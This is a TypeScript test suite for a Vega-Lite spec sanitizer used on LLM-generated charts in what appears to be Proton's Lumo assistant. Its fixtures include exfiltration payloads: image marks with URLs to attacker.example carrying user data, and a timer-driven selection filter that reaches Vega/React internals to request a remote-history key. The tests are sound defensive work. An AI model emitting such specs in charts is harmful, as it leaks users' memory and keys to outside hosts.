import { type TopLevelSpec, compile } from 'vega-lite';

import { PROTON_PURPLE } from './protonVegaTheme';
import { VegaSpecParseError, VegaSpecSecurityError, sanitizeVegaSpec } from './sanitizeVegaSpec';

/** Minimal structural clone of the reported dual-panel timer PoC (redacted receiver URL). */
function buildRemoteHistoryKeyExfiltrationPoCSkeleton(): Record<string, unknown> {
    return {
        $schema: 'https://vega.github.io/schema/vega-lite/v6.json',
        data: {
            name: 'leak',
            values: [{ waitCount: 0, cursor: 0 }],
        },
        datasets: {
            scratch: [],
        },
        vconcat: [
            {
                data: { name: 'leak' },
                params: [
                    {
                        name: 'probe',
                        select: {
                            type: 'point',
                            on: {
                                source: 'timer',
                                type: 400,
                                filter: "event.dataflow._el ? modify('scratch',{type:'lumo/space/list/request'}) : 0",
                            },
                            clear: false,
                        },
                    },
                ],
                mark: 'text',
                encoding: {
                    text: { value: 'Remote history validation' },
                },
                height: 100,
            },
            {
                data: { name: 'scratch' },
                mark: { type: 'text', opacity: 0 },
                encoding: {
                    text: { value: '' },
                },
                height: 100,
            },
        ],
    };
}

function specHasParams(spec: Record<string, unknown>): boolean {
    let found = false;
    const visit = (value: unknown): void => {
        if (found || value === null || typeof value !== 'object') {
            return;
        }
        if (Array.isArray(value)) {
            value.forEach(visit);
            return;
        }
        const objectValue = value as Record<string, unknown>;
        if (objectValue.params !== undefined) {
            found = true;
            return;
        }
        Object.values(objectValue).forEach(visit);
    };
    visit(spec);
    return found;
}

describe('sanitizeVegaSpec', () => {
    const validSpec = JSON.stringify({
        $schema: 'https://vega.github.io/schema/vega-lite/v6.json',
        description: 'Sample chart',
        data: {
            values: [
                { category: 'A', amount: 28 },
                { category: 'B', amount: 55 },
            ],
        },
        mark: 'bar',
        encoding: {
            x: { field: 'category', type: 'nominal' },
            y: { field: 'amount', type: 'quantitative' },
        },
    });

    it('accepts inline Vega-Lite specs', () => {
        const spec = sanitizeVegaSpec(validSpec);
        expect(spec).toMatchObject({
            mark: { type: 'bar', color: PROTON_PURPLE },
        });
    });

    it('rejects external data URLs', () => {
        const spec = JSON.stringify({
            data: { url: 'https://example.com/data.json' },
            mark: 'bar',
            encoding: {
                x: { field: 'category', type: 'nominal' },
                y: { field: 'amount', type: 'quantitative' },
            },
        });

        expect(() => sanitizeVegaSpec(spec)).toThrow(VegaSpecSecurityError);
    });

    it('rejects nested lookup data URLs', () => {
        const spec = JSON.stringify({
            transform: [
                {
                    lookup: 'id',
                    from: {
                        data: {
                            url: 'https://example.com/lookup.json',
                        },
                        key: 'id',
                        fields: ['value'],
                    },
                },
            ],
            mark: 'bar',
            encoding: {
                x: { field: 'category', type: 'nominal' },
                y: { field: 'amount', type: 'quantitative' },
            },
        });

        expect(() => sanitizeVegaSpec(spec)).toThrow(VegaSpecSecurityError);
    });

    it('strips dangerous usermeta embed overrides', () => {
        const spec = JSON.stringify({
            usermeta: {
                embedOptions: {
                    loader: { http: true },
                    actions: true,
                },
            },
            data: { values: [{ x: 1 }] },
            mark: 'point',
            encoding: {
                x: { field: 'x', type: 'quantitative' },
            },
        });

        const sanitized = sanitizeVegaSpec(spec) as { usermeta?: Record<string, unknown> };
        expect(sanitized.usermeta?.embedOptions).toBeUndefined();
    });

    it('rejects invalid JSON', () => {
        expect(() => sanitizeVegaSpec('{ not json')).toThrow(VegaSpecParseError);
        expect(() => sanitizeVegaSpec('{ not json')).toThrow(/not valid JSON/);
    });

    it('accepts trailing commas from LLM output', () => {
        const spec = `{
            "mark": "bar",
            "encoding": {
                "x": { "field": "category", "type": "nominal" },
                "y": { "field": "amount", "type": "quantitative" },
            },
            "data": { "values": [{ "category": "A", "amount": 1 },] },
        }`;

        expect(sanitizeVegaSpec(spec)).toMatchObject({ mark: { type: 'bar', color: PROTON_PURPLE } });
    });

    it('accepts unquoted object keys from LLM output', () => {
        const spec = `{
            "$schema": "https://vega.github.io/schema/vega-lite/v6.json",
            "width": "container",
            "data": {
                "values": [
                    {"week": 1, "DAU": 31.2},
                    {"week": 2, "DAU": 33.4}
                ]
            },
            "mark": {"type": "line", "point": true},
            "encoding": {
                "x": {"field": "week", "type": "ordinal", "axis": {"title": "Week"}},
                "y": {"field": "DAU", "type": "quantitative", "axis": {"title": "DAU (k)", format: ".1f"}}
            }
        }`;

        const sanitized = sanitizeVegaSpec(spec) as {
            encoding?: { y?: { axis?: { format?: string } } };
        };

        expect(sanitized.encoding?.y?.axis).toMatchObject({ format: '.1f' });
    });

    it('allows url as a data field name inside inline values', () => {
        const spec = JSON.stringify({
            mark: 'bar',
            encoding: {
                x: { field: 'url', type: 'nominal' },
                y: { field: 'amount', type: 'quantitative' },
            },
            data: {
                values: [{ url: 'https://example.com/page', amount: 3 }],
            },
        });

        expect(sanitizeVegaSpec(spec)).toMatchObject({ mark: { type: 'bar', color: PROTON_PURPLE } });
    });

    it('repairs double-wrapped objects in data.values arrays', () => {
        const spec = `{
            "$schema": "https://vega.github.io/schema/vega-lite/v6.json",
            "width": "container",
            "data": {
                "values": [
                    { "hour": 0, "rate": 0.41 },
                    { "hour": 14, "rate": 1.34 }
                ]
            },
            "layer": [
                {
                    "mark": { "type": "bar" },
                    "encoding": {
                        "x": { "field": "hour", "type": "ordinal" },
                        "y": { "field": "rate", "type": "quantitative" }
                    }
                },
                {
                    "data": { "values": [{ { "threshold": 0.46 } }] },
                    "mark": { "type": "rule" },
                    "encoding": {
                        "y": { "field": "threshold", "type": "quantitative" }
                    }
                }
            ]
        }`;

        const sanitized = sanitizeVegaSpec(spec) as {
            layer?: { data?: { values?: { threshold?: number }[] } }[];
        };

        expect(sanitized.layer?.[1]?.data?.values).toEqual([{ threshold: 0.46 }]);
    });

    it('does not break valid nested objects inside array values', () => {
        const spec = JSON.stringify({
            data: { values: [{ metrics: { rate: 0.46, count: 3 } }] },
            mark: 'bar',
            encoding: {
                x: { field: 'metrics', type: 'nominal' },
                y: { field: 'count', type: 'quantitative' },
            },
        });

        expect(sanitizeVegaSpec(spec)).toMatchObject({
            data: { values: [{ metrics: { rate: 0.46, count: 3 } }] },
        });
    });

    it('forces responsive width so charts fill the card', () => {
        const spec = JSON.stringify({
            width: 480,
            height: 260,
            mark: 'line',
            encoding: {
                x: { field: 'year', type: 'ordinal' },
                y: { field: 'price', type: 'quantitative' },
            },
            data: {
                values: [{ year: 2020, price: 40 }],
            },
        });

        const sanitized = sanitizeVegaSpec(spec);
        expect(sanitized).toMatchObject({
            width: 'container',
            height: 260,
        });
        expect((sanitized as Record<string, unknown>).autosize).toEqual({ type: 'fit-x', contains: 'padding' });
    });

    it('rejects image marks that exfiltrate data via encoding.url (memory exfil PoC)', () => {
        const spec = JSON.stringify({
            $schema: 'https://vega.github.io/schema/vega-lite/v6.json',
            data: {
                values: [{ x: 1, y: 1, img: 'https://attacker.example/badge.png?d=Sebastian+Argentina' }],
            },
            mark: { type: 'image', width: 40, height: 40 },
            encoding: {
                x: { field: 'x', type: 'quantitative' },
                y: { field: 'y', type: 'quantitative' },
                url: { field: 'img', type: 'nominal' },
            },
        });

        expect(() => sanitizeVegaSpec(spec)).toThrow(VegaSpecSecurityError);
        expect(() => sanitizeVegaSpec(spec)).toThrow(/Mark type "image" is not allowed/);
    });

    it('rejects geoshape marks', () => {
        const spec = JSON.stringify({
            data: {
                values: [
                    {
                        type: 'Feature',
                        geometry: { type: 'Point', coordinates: [0, 0] },
                    },
                ],
            },
            mark: 'geoshape',
            encoding: {
                shape: { field: 'geojson', type: 'geojson' },
            },
        });

        expect(() => sanitizeVegaSpec(spec)).toThrow(VegaSpecSecurityError);
        expect(() => sanitizeVegaSpec(spec)).toThrow(/Mark type "geoshape" is not allowed/);
    });

    it('rejects nested image marks inside layer specs', () => {
        const spec = JSON.stringify({
            layer: [
                {
                    mark: 'bar',
                    encoding: {
                        x: { field: 'category', type: 'nominal' },
                        y: { field: 'amount', type: 'quantitative' },
                    },
                    data: { values: [{ category: 'A', amount: 1 }] },
                },
                {
                    data: { values: [{ x: 1, y: 1, img: 'https://attacker.example/leak.png?secret=1' }] },
                    mark: { type: 'image', width: 20, height: 20 },
                    encoding: {
                        x: { field: 'x', type: 'quantitative' },
                        y: { field: 'y', type: 'quantitative' },
                        url: { field: 'img', type: 'nominal' },
                    },
                },
            ],
        });

        expect(() => sanitizeVegaSpec(spec)).toThrow(VegaSpecSecurityError);
    });

    it('rejects unknown mark types not on the allowlist', () => {
        const spec = JSON.stringify({
            data: { values: [{ value: 1 }] },
            mark: 'link',
            encoding: {
                href: { field: 'url', type: 'nominal' },
                tooltip: { field: 'value', type: 'quantitative' },
            },
        });

        expect(() => sanitizeVegaSpec(spec)).toThrow(VegaSpecSecurityError);
        expect(() => sanitizeVegaSpec(spec)).toThrow(/Mark type "link" is not allowed/);
    });

    it('neutralizes the reported dual-panel timer remote-history exfiltration PoC skeleton', () => {
        const raw = JSON.stringify(buildRemoteHistoryKeyExfiltrationPoCSkeleton());
        const spec = sanitizeVegaSpec(raw) as Record<string, unknown>;

        expect(spec.datasets).toBeUndefined();
        expect(specHasParams(spec)).toBe(false);
        expect(() => compile(spec as unknown as TopLevelSpec)).not.toThrow();
    });

    it('strips transform filters that reference Vega host internals', () => {
        const spec = JSON.stringify({
            mark: 'bar',
            data: { values: [{ x: 1, y: 2 }] },
            transform: [{ filter: "event.dataflow._el ? 1 : 0" }],
            encoding: {
                x: { field: 'x', type: 'quantitative' },
                y: { field: 'y', type: 'quantitative' },
            },
        });

        const sanitized = sanitizeVegaSpec(spec) as Record<string, unknown>;
        const transforms = sanitized.transform as Record<string, unknown>[] | undefined;
        expect(transforms?.[0]?.filter).toBeUndefined();
    });

    it('strips timer selection handlers with hostile filter expressions', () => {
        const spec = JSON.stringify({
            mark: 'point',
            data: { values: [{ x: 1, y: 1 }] },
            params: [
                {
                    name: 'probe',
                    select: {
                        type: 'point',
                        on: {
                            source: 'timer',
                            type: 200,
                            filter: "memoizedProps.store.getState ? 1 : 0",
                        },
                    },
                },
            ],
            encoding: {
                x: { field: 'x', type: 'quantitative' },
                y: { field: 'y', type: 'quantitative' },
            },
        });

        const sanitized = sanitizeVegaSpec(spec) as Record<string, unknown>;
        expect(specHasParams(sanitized)).toBe(false);
    });
});
